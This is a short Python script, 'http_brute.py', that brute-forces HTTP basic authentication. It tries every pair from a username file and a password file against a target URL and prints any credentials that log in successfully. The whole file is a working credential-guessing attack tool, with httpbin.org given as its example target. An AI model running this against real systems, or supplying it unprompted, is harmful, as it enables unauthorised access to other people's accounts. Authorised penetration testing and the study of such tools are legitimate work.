#!/usr/bin/python3
''' Basic http authentication bruteforce script.

A script for bruteforcing basic http authentication

Test with the following commandline
python3 http_brute.py http://httpbin.org/basic-auth/username/password  users.txt passwords.txt
'''

import requests
import sys


def execute_scan(host, userfile, passwordfile, port, ssl):
    '''Execute the bruteforce scan
    :param str host: hosts (IP addresses, hostnames) comma separated
    :param str userfile: filename with usernames
    :param str passwordfile: filename with passwords
    :param int port : port number
    :param bool ssl: bool to set ssl
    :param bool use_subset: bool for subset of lists and slow connection
    '''

    connect_timeout = 2
    read_timeout = 2

    try:  # exceptions with files
        # open the Userfile in users list
        users = []
        with open(userfile) as file:
            for line in file:
                users.append(line.strip())

        passwords = []
        with open(passwordfile) as file:
            for line in file:
                passwords.append(line.strip())
    except Exception as FileError:
        print(FileError)

    # start actual brute forcing
    for user in users:
        print(user)
        for password in passwords:
            brutehttp(host, port, connect_timeout, read_timeout, user, password, ssl)


def brutehttp(host, port, connect_timeout, read_timeout, users, passw, SSL):
    '''This function executes the http basic authentication bruteforce.
    :param str host: hosts (IP addresses, hostnames) comma separated
    :param int port: port number
    :param int connect_timeout: connect timeout of http
    :param int read_timeout: read timeout of http
    :param str users: user
    :param str passw: password
    :param bool ssl: bool to set ssl
    '''
    http_timeout = (connect_timeout, read_timeout)
    print(http_timeout)
    print('1 - test')
    # If the timeout set low, you can see a timeout instead of a invalid
    # credentials.
    try:
        # connect to to ftp server and connect_timeout
        # check if connection should be SSL
        basicAuthCredentials = (users, passw)
        print(basicAuthCredentials)
        # Send HTTP GET request to server and attempt to receive a response
        response = requests.get(host, timeout=http_timeout, auth=basicAuthCredentials)

        # If the HTTP GET request can be served
        if response.status_code == 200:
            print('Login succeeded with: ' + users + " " + passw)
        else:
            print('Authentication failed')

    except Exception as error:
        print(error)


if len(sys.argv) != 4:
    print("Not enough arguments:\n" +
          'Usage: http_brute.py target userfile passfile')
else:
    host = sys.argv[1]
    users = sys.argv[2]
    passw = sys.argv[3]
    ssl = False
    execute_scan(host, users, passw, 80, ssl)
